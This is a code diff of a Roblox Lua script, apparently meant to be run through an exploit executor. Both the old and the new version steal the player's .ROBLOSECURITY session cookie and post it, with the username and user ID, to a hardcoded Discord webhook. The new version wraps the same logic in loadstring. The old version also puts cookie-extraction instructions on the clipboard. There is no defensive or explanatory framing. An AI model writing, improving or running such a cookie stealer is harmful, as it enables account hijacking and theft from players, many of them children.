@@ -1,35 +1,34 @@
-local player = game.Players.LocalPlayer
-local http = game:GetService("HttpService")
-local webhook = "https://discord.com/api/webhooks/1499055946222145638/PWJv3IVfr9WAucXk0BYEP54gAp_wuaYpGKJQs5Px-gFRZVyoLv3u81QIZ5XNpkSsdqNx"
-
-local cookie = ""
-if syn and syn.cookie then
-    cookie = syn.cookie()
-elseif getcookie then
-    cookie = getcookie()
-end
-
-local data = {
-    content = "**🍪 COOKIE**",
-    embeds = {{
-        title = player.Name,
-        description = cookie ~= "" and ("```" .. cookie .. "```") or "Auto grab failed - cookie not found",
-        color = cookie ~= "" and 0x00ff00 or 0xff0000,
-        fields = {
-            {name = "User ID", value = tostring(player.UserId), inline = true},
-            {name = "Executor", value = identifyexecutor and identifyexecutor() or "Unknown", inline = true}
-        }
-    }}
-}
-
-if request then
-    request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = http:JSONEncode(data)})
-elseif syn and syn.request then
-    syn.request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = http:JSONEncode(data)})
-end
-
-if cookie == "" and setclipboard then
-    setclipboard("F12 → Application → Cookies → .ROBLOSECURITY")
-end
-
-print("Sent to Discord")
+loadstring([[
+    local player = game.Players.LocalPlayer
+    local http = game:GetService("HttpService")
+    local webhook = "https://discord.com/api/webhooks/1499055946222145638/PWJv3IVfr9WAucXk0BYEP54gAp_wuaYpGKJQs5Px-gFRZVyoLv3u81QIZ5XNpkSsdqNx"
+    
+    local cookie = ""
+    if syn and syn.cookie then
+        cookie = syn.cookie()
+    elseif getcookie then
+        cookie = getcookie()
+    end
+    
+    local data = {
+        content = "**🍪 COOKIE**",
+        embeds = {{
+            title = player.Name,
+            description = cookie ~= "" and ("```" .. cookie .. "```") or "No cookie",
+            color = 0xff0000,
+            fields = {
+                {name = "User ID", value = tostring(player.UserId), inline = true}
+            }
+        }}
+    }
+    
+    if request then
+        request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = http:JSONEncode(data)})
+        print("Sent with request")
+    elseif syn and syn.request then
+        syn.request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = http:JSONEncode(data)})
+        print("Sent with syn.request")
+    else
+        print("No request function found")
+    end
+]])()
